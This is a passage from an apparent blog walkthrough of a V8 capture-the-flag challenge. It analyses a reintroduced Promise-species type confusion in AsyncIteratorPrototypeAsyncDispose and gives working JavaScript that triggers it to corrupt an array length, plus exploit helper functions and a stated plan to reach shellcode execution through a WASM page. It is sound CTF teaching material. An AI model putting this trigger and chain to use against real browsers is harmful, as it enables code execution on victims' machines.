</span></span><span class=line><span class=cl>-------------------</span></span></code></pre></div></div><p>This is it for the internals section of this article, by now you have all the prerequisite knowledge needed to understand how V8 exploitation works (and more!).</p><p>In the next section I will give a detailed walkthrough of a V8 ctf challenge, focusing on explaining the various V8 exploitation primitives and the ways I can achieve code execution in the engine.</p><h2 class="relative group">Vow Breaker walkthrough<div id=vow-breaker-walkthrough class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#vow-breaker-walkthrough aria-label=Anchor>#</a></span></h2><p>Challenge files: <a href="https://drive.google.com/file/d/1z7ei9ZLxQl76AFqDdJAqMtnpp3pxK3_v/view?usp=sharing" target=_blank rel=noreferrer>link</a></p><p>Typically V8 challenges have patch files which introduce the vulnerability. This often introduces out of bounds vulnerabilities, which can later be escalated to more severe capabilities. I began by looking into the challenge.diff file:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-diff data-lang=diff><span class=line><span class=cl><span class=gh>diff --git a/src/builtins/iterator.tq b/src/builtins/iterator.tq
</span></span></span><span class=line><span class=cl><span class=gh>index a9458219c1e..84afb16cd43 100644
</span></span></span><span class=line><span class=cl><span class=gd>--- a/src/builtins/iterator.tq
</span></span></span><span class=line><span class=cl><span class=gi>+++ b/src/builtins/iterator.tq
</span></span></span><span class=line><span class=cl><span class=gu>@@ -375,7 +375,8 @@ transitioning javascript builtin AsyncIteratorPrototypeAsyncDispose(
</span></span></span><span class=line><span class=cl>       // d. IfAbruptRejectPromise(resultWrapper, promiseCapability).
</span></span><span class=line><span class=cl>       const promiseFun = *NativeContextSlot(
</span></span><span class=line><span class=cl>           ContextSlot::PROMISE_FUNCTION_INDEX);
</span></span><span class=line><span class=cl><span class=gd>-      const resultWrapper = promise::PromiseResolve(promiseFun, result);
</span></span></span><span class=line><span class=cl><span class=gi>+      const constructor = SpeciesConstructor(capability, promiseFun);
</span></span></span><span class=line><span class=cl><span class=gi>+      const resultWrapper = promise::PromiseResolve(constructor, result);
</span></span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>       // e. Let unwrap be a new Abstract Closure that performs the following
</span></span><span class=line><span class=cl>       // steps when called: i. Return undefined.
</span></span><span class=line><span class=cl><span class=gh>diff --git a/src/d8/d8.cc b/src/d8/d8.cc
</span></span></span><span class=line><span class=cl><span class=gh>index d91c78951b3..79b2432c768 100644
</span></span></span><span class=line><span class=cl><span class=gd>--- a/src/d8/d8.cc
</span></span></span><span class=line><span class=cl><span class=gi>+++ b/src/d8/d8.cc
</span></span></span><span class=line><span class=cl><span class=gu>@@ -4213,11 +4213,13 @@ Local&lt;FunctionTemplate&gt; Shell::CreateNodeTemplates(
</span></span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl> Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) {
</span></span><span class=line><span class=cl>   Local&lt;ObjectTemplate&gt; global_template = ObjectTemplate::New(isolate);
</span></span><span class=line><span class=cl><span class=gd>-  global_template-&gt;Set(Symbol::GetToStringTag(isolate),
</span></span></span><span class=line><span class=cl><span class=gi>+ /* global_template-&gt;Set(Symbol::GetToStringTag(isolate),
</span></span></span><span class=line><span class=cl>                        String::NewFromUtf8Literal(isolate, &#34;global&#34;));
</span></span><span class=line><span class=cl><span class=gi>+                      */
</span></span></span><span class=line><span class=cl><span class=gi>+
</span></span></span><span class=line><span class=cl>   global_template-&gt;Set(isolate, &#34;version&#34;,
</span></span><span class=line><span class=cl>                        FunctionTemplate::New(isolate, Version));
</span></span><span class=line><span class=cl><span class=gd>-
</span></span></span><span class=line><span class=cl><span class=gi>+/*
</span></span></span><span class=line><span class=cl>   global_template-&gt;Set(isolate, &#34;print&#34;, FunctionTemplate::New(isolate, Print));
</span></span><span class=line><span class=cl>   global_template-&gt;Set(isolate, &#34;printErr&#34;,
</span></span><span class=line><span class=cl>                        FunctionTemplate::New(isolate, PrintErr));
</span></span><span class=line><span class=cl><span class=gu>@@ -4237,9 +4239,11 @@ Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) {
</span></span></span><span class=line><span class=cl>                        FunctionTemplate::New(isolate, ExecuteFile));
</span></span><span class=line><span class=cl>   global_template-&gt;Set(isolate, &#34;setTimeout&#34;,
</span></span><span class=line><span class=cl>                        FunctionTemplate::New(isolate, SetTimeout));
</span></span><span class=line><span class=cl><span class=gi>+                      */
</span></span></span><span class=line><span class=cl>   // Some Emscripten-generated code tries to call &#39;quit&#39;, which in turn would
</span></span><span class=line><span class=cl>   // call C&#39;s exit(). This would lead to memory leaks, because there is no way
</span></span><span class=line><span class=cl>   // we can terminate cleanly then, so we need a way to hide &#39;quit&#39;.
</span></span><span class=line><span class=cl><span class=gi>+  /*
</span></span></span><span class=line><span class=cl>   if (!options.omit_quit) {
</span></span><span class=line><span class=cl>     global_template-&gt;Set(isolate, &#34;quit&#34;, FunctionTemplate::New(isolate, Quit));
</span></span><span class=line><span class=cl>   }
</span></span><span class=line><span class=cl><span class=gu>@@ -4259,6 +4263,7 @@ Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) {
</span></span></span><span class=line><span class=cl>                          Shell::CreateAsyncHookTemplate(isolate));
</span></span><span class=line><span class=cl>   }
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=gi>+                      */
</span></span></span><span class=line><span class=cl>   return global_template;
</span></span><span class=line><span class=cl> }
</span></span></code></pre></div></div><p>There may seem like there is a lot to unpack here, but everything boils down to this line which got introduced to the code:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>const constructor = SpeciesConstructor(capability, promiseFun);</span></span></code></pre></div></div><h3 class="relative group">Root cause analysis<div id=root-cause-analysis class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#root-cause-analysis aria-label=Anchor>#</a></span></h3><p>This bug is just a reintroduction of <a href=https://issues.chromium.org/issues/380677637 target=_blank rel=noreferrer>380677637</a> into the current version of v8 (I recommend reading that chromium issue before continuing), There’s a bit of prerequisite knowledge needed about this scenario that I’ll dive into.</p><p>The vulnerable function is <a href=https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/AsyncIterator/Symbol.asyncDispose target=_blank rel=noreferrer>AsyncIteratorPrototypeAsyncDispose</a> which is basically a clean up function that is automatically called when an async scope is exited.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>async</span> <span class=kd>function</span> <span class=nx>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 1. Create the generator. &#39;await using&#39; registers it for cleanup.
</span></span></span><span class=line><span class=cl>    <span class=kr>await</span> <span class=nx>using</span> <span class=nx>myIterator</span> <span class=o>=</span> <span class=nx>generator</span><span class=p>();</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// 2. Use it a bit...
</span></span></span><span class=line><span class=cl>    <span class=kr>await</span> <span class=nx>myIterator</span><span class=p>.</span><span class=nx>next</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=c1>// 3. &lt;--- End of block (Scope exit)
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 4. The engine AUTOMATICALLY finds myIterator[Symbol.asyncDispose] and calls it.
</span></span></span><span class=line><span class=cl><span class=c1>// 5. That internal function calls myIterator.return().
</span></span></span><span class=line><span class=cl><span class=c1>// 6. The generator closes.
</span></span></span></code></pre></div></div><p>This is a snippet from that bug report I linked earlier:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>transitioning javascript builtin AsyncIteratorPrototypeAsyncDispose(
</span></span><span class=line><span class=cl>    js-implicit context: Context, receiver: JSAny)(): JSAny {
</span></span><span class=line><span class=cl>  // JSPromise object that is returned by this method
</span></span><span class=line><span class=cl>  const capability = promise::NewJSPromise();
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  try {
</span></span><span class=line><span class=cl>    try {
</span></span><span class=line><span class=cl>      // Get the &#34;return&#34; method on the async iterator
</span></span><span class=line><span class=cl>      const returnMethod = GetMethod(receiver, kReturnString) otherwise IfUndefined;
</span></span><span class=line><span class=cl>      // Call the &#34;return&#34; method on the async iterator object, which returns a JSPromise object
</span></span><span class=line><span class=cl>      const result = Call(context, returnMethod, receiver, Undefined);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      // Get the Promise method in the native context
</span></span><span class=line><span class=cl>      const promiseFun = *NativeContextSlot(ContextSlot::PROMISE_FUNCTION_INDEX);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      // Get the constructor that creates a new Promise object
</span></span><span class=line><span class=cl>      // Since Promise[Symbol.species] is set to MyConstructor in the POC
</span></span><span class=line><span class=cl>      // Therefore, the constructor obtained here is MyConstructor
</span></span><span class=line><span class=cl>      const constructor = SpeciesConstructor(capability, promiseFun);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      // Call Promise.resolve(result) to create a JSPromise object that wraps the result of the return() method
</span></span><span class=line><span class=cl>      // Note: Here the constructor is our custom MyConstructor
</span></span><span class=line><span class=cl>      // So PromiseResolve() will create the object to be returned using MyConstructor as the constructor
</span></span><span class=line><span class=cl>      // Therefore, resultWrapper is actually the fake_promise object in the POC
</span></span><span class=line><span class=cl>      const resultWrapper = promise::PromiseResolve(constructor, result);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      // handler for the then method
</span></span><span class=line><span class=cl>      const resolveContext = ...;
</span></span><span class=line><span class=cl>      const onFulfilled = AllocateRootFunctionWithContext(
</span></span><span class=line><span class=cl>          kAsyncIteratorPrototypeAsyncDisposeResolveClosureSharedFun,
</span></span><span class=line><span class=cl>          resolveContext, %RawDownCast&lt;NativeContext&gt;(context));
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      // Execute the .then method on resultWrapper
</span></span><span class=line><span class=cl>      promise::PerformPromiseThenImpl(
</span></span><span class=line><span class=cl>          // Here it tries to convert the JSObject type fake_promise to JSPromise, causing a crash
</span></span><span class=line><span class=cl>          UnsafeCast&lt;JSPromise&gt;(resultWrapper),  
</span></span><span class=line><span class=cl>          onFulfilled,    // onResolve
</span></span><span class=line><span class=cl>          UndefinedConstant(),   // onReject
</span></span><span class=line><span class=cl>          capability    // Promise object returned when the then() method is completed
</span></span><span class=line><span class=cl>        );
</span></span><span class=line><span class=cl>    } label IfUndefined {
</span></span><span class=line><span class=cl>      ...
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    // 7. Return promiseCapability.[[Promise]].
</span></span><span class=line><span class=cl>    return capability;
</span></span><span class=line><span class=cl>  } catch (e, _message) {
</span></span><span class=line><span class=cl>    ...
</span></span><span class=line><span class=cl>  }
</span></span><span class=line><span class=cl>}</span></span></code></pre></div></div><p>The critical line in this code block is:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>const constructor = SpeciesConstructor(capability, promiseFun);</span></span></code></pre></div></div><p>This is problematic because I can set the promise SpeciesConstructor to my own custom constructor:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Object.defineProperty(Promise, Symbol.species, {
</span></span><span class=line><span class=cl>    &#34;value&#34;: MyConstructor
</span></span><span class=line><span class=cl>});</span></span></code></pre></div></div><p>To further understand how promises work under the hood, let’s examine the <a href=https://tc39.es/ecma262/#sec-promise-executor target=_blank rel=noreferrer>ECMAScript spec for promise constructors</a>:</p><ul><li>A promise constructor must take an executor function as its argument</li><li>This executor function in turn takes two arguments:</li><li><ul><li>A resolve function that gets called when promise is resolved (the query was successful), it takes a single argument which is either the value of the deferred action or another promise.</li></ul></li><li><ul><li>A reject function that gets called when the promise fails. It takes a single argument which is an Error object.</li></ul></li><li>In addition these two functions are defined in the constructor itself usually.</li><li>The constructor must return the Promise object.</li></ul><p>And <code>AsyncIteratorPrototypeAsyncDispose</code> is not equipped to deal with possibly malicious constructors, so calling it with a custom one set will allow me to corrupt memory</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>const resultWrapper = promise::PromiseResolve(constructor, result);</span></span></code></pre></div></div><p>I can then call the promise resolve method on my custom promise.</p><p>The resultWrapper should have been a JSPromise which wraps the result of our promise but in reality it is a JSArray due to my custom constructor.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>promise::PerformPromiseThenImpl(
</span></span><span class=line><span class=cl>          // Here it tries to convert the JSObject type fake_promise to JSPromise, causing a crash
</span></span><span class=line><span class=cl>          UnsafeCast&lt;JSPromise&gt;(resultWrapper),  
</span></span><span class=line><span class=cl>          onFulfilled,    // onResolve
</span></span><span class=line><span class=cl>          UndefinedConstant(),   // onReject
</span></span><span class=line><span class=cl>          capability    // Promise object returned when the then() method is completed
</span></span><span class=line><span class=cl>        );</span></span></code></pre></div></div><p>This line shows that the function casts my custom promise to a JSPromise without any checks, thus allowing a type confusion.</p><p>Without going into further details, just know that this type confusion allows me to get an array with an unreasonably high length</p><p><figure><img src=https://miro.medium.com/v2/resize:fit:700/1*U08DBDE9x-T3aba1OAlG7g.png alt title="check out the length of the array!"><figcaption>check out the length of the array!</figcaption></figure></p><p>Here is the code so far:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>async</span> <span class=kd>function</span><span class=o>*</span> <span class=nx>generator</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>yield</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>gen</span> <span class=o>=</span> <span class=nx>generator</span><span class=p>();</span>  
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>corrupted_arr</span> <span class=o>=</span> <span class=p>[</span><span class=mf>1.1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>MyConstructor</span><span class=p>(</span><span class=nx>executor</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nx>myResolve</span><span class=p>(</span><span class=nx>value</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nx>myReject</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nx>executor</span><span class=p>(</span><span class=nx>myResolve</span><span class=p>,</span> <span class=nx>myReject</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>corrupted_arr</span><span class=p>;</span> <span class=c1>// EVIL!! &lt;- instead of returning a Promise,
</span></span></span><span class=line><span class=cl>                          <span class=c1>//           I return an array
</span></span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>Object</span><span class=p>.</span><span class=nx>defineProperty</span><span class=p>(</span><span class=nb>Promise</span><span class=p>,</span> <span class=nx>Symbol</span><span class=p>.</span><span class=nx>species</span><span class=p>,</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;value&#34;</span><span class=o>:</span> <span class=nx>MyConstructor</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>gen</span><span class=p>[</span><span class=nx>Symbol</span><span class=p>.</span><span class=nx>asyncDispose</span><span class=p>]();</span></span></span></code></pre></div></div><ul><li>I’d like to make a little side note here:<br>The heap spraying that 303f06e3 used in <a href=https://issues.chromium.org/issues/380677637 target=_blank rel=noreferrer>their vulnerability report</a> seems unnecessary to me, I tried removing it and using a singular array and the exploit worked as usual.</li></ul><h3 class="relative group">Exploitation<div id=exploitation class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#exploitation aria-label=Anchor>#</a></span></h3><p>The plan for exploitation is :</p><ol><li>Make the addrof and fakeobj primitives</li><li>Make the caged v8 heap read and write primitives</li><li>Use all of the primitives I created to smuggle shellcode into a WASM RWX page</li><li>Trigger the WASM code</li></ol><p>Let us get started!</p><p>First I declared some necessary helper functions:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>// All credit goes to s41nt0l3xus for these helper functions
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// conversation arrays
</span></span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>conversion_buffer</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ArrayBuffer</span><span class=p>(</span><span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>float_view</span>        <span class=o>=</span> <span class=k>new</span> <span class=nx>Float64Array</span><span class=p>(</span><span class=nx>conversion_buffer</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>int_view</span>          <span class=o>=</span> <span class=k>new</span> <span class=nx>BigUint64Array</span><span class=p>(</span><span class=nx>conversion_buffer</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Convert BigInt to hex representation
</span></span></span><span class=line><span class=cl><span class=nx>BigInt</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>hex</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;0x&#39;</span> <span class=o>+</span> <span class=k>this</span><span class=p>.</span><span class=nx>toString</span><span class=p>(</span><span class=mi>16</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Convert BigInt to float representation
</span></span></span><span class=line><span class=cl><span class=nx>BigInt</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>i2f</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>int_view</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=k>this</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>float_view</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Set the lowest bit to represent a tagged pointer
</span></span></span><span class=line><span class=cl><span class=nx>BigInt</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>tag</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>this</span> <span class=o>|</span> <span class=mi>1</span><span class=nx>n</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Unset the lowest bit to represent an untagged pointer
</span></span></span><span class=line><span class=cl><span class=nx>BigInt</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>unTag</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>this</span> <span class=o>&amp;</span> <span class=o>~</span><span class=p>(</span><span class=mi>1</span><span class=nx>n</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>BigInt</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>toSmi</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>this</span> <span class=o>&lt;&lt;</span> <span class=mi>1</span><span class=nx>n</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>BigInt</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>fromSmi</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>this</span> <span class=o>&gt;&gt;</span> <span class=mi>1</span><span class=nx>n</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// get low dword
</span></span></span><span class=line><span class=cl><span class=nx>BigInt</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>low</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>this</span> <span class=o>&amp;</span> <span class=nx>BigInt</span><span class=p>(</span><span class=mh>0xffffffff</span><span class=nx>n</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// get high dword
</span></span></span><span class=line><span class=cl><span class=nx>BigInt</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>high</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>this</span> <span class=o>&gt;&gt;</span> <span class=nx>BigInt</span><span class=p>(</span><span class=mi>32</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Convert a Number to hex representation
</span></span></span><span class=line><span class=cl><span class=nb>Number</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>hex</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;0x&#39;</span> <span class=o>+</span> <span class=k>this</span><span class=p>.</span><span class=nx>toString</span><span class=p>(</span><span class=mi>16</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Convert a Number (float) to integer representation
</span></span></span><span class=line><span class=cl><span class=nb>Number</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>f2i</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>float_view</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=k>this</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>int_view</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>pack</span><span class=p>(</span><span class=nx>low</span><span class=p>,</span> <span class=nx>high</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nx>low</span> <span class=o>|</span> <span class=p>(</span><span class=nx>high</span> <span class=o>&lt;&lt;</span> <span class=mi>32</span><span class=nx>n</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>sleepFor</span><span class=p>(</span><span class=nx>sleepDuration</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>now</span> <span class=o>=</span> <span class=k>new</span> <span class=nb>Date</span><span class=p>().</span><span class=nx>getTime</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=k>new</span> <span class=nb>Date</span><span class=p>().</span><span class=nx>getTime</span><span class=p>()</span> <span class=o>&lt;</span> <span class=nx>now</span> <span class=o>+</span> <span class=nx>sleepDuration</span><span class=p>)</span> <span class=p>{</span> <span class=cm>/* do nothing */</span> <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>loghex</span><span class=p>(</span><span class=nx>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>x</span><span class=p>.</span><span class=nx>hex</span><span class=p>());</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p>The reason I have a float to BigInt convertor is that the values I read with the OOB are float numbers which are impractical to work with.</p><p>The high and low methods are for extracting the upper 4 bytes or lower 4 bytes of an 8 byte value, I need them due to <a href=https://v8.dev/blog/pointer-compression target=_blank rel=noreferrer>v8’s pointer compression</a>.</p><h4 class="relative group">addrof & fakeobj primitives<div id=addrof--fakeobj-primitives class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#addrof--fakeobj-primitives aria-label=Anchor>#</a></span></h4><p>In V8 exploitation the first primitives needed to get arbitrary read and write are addrof and fakeobj. They allow me to both get the address of any heap object and make v8 treat something as an object respectively.</p><p>There are various ways to get these capabilities, in this section I will interact directly with the pointers of the array elements.</p><p>As shown in the internals section, the elements of a float array are situated right before its fields in-memory. Let’s re-verify it.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>// conversation arrays
</span></span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>conversion_buffer</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ArrayBuffer</span><span class=p>(</span><span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>float_view</span>        <span class=o>=</span> <span class=k>new</span> <span class=nx>Float64Array</span><span class=p>(</span><span class=nx>conversion_buffer</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>int_view</span>          <span class=o>=</span> <span class=k>new</span> <span class=nx>BigUint64Array</span><span class=p>(</span><span class=nx>conversion_buffer</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Convert BigInt to hex representation
</span></span></span><span class=line><span class=cl><span class=nx>BigInt</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>hex</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;0x&#39;</span> <span class=o>+</span> <span class=k>this</span><span class=p>.</span><span class=nx>toString</span><span class=p>(</span><span class=mi>16</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Convert BigInt to float representation
</span></span></span><span class=line><span class=cl><span class=nx>BigInt</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>i2f</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>int_view</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=k>this</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>float_view</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Set the lowest bit to represent a tagged pointer
</span></span></span><span class=line><span class=cl><span class=nx>BigInt</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>tag</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>this</span> <span class=o>|</span> <span class=mi>1</span><span class=nx>n</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Unset the lowest bit to represent an untagged pointer
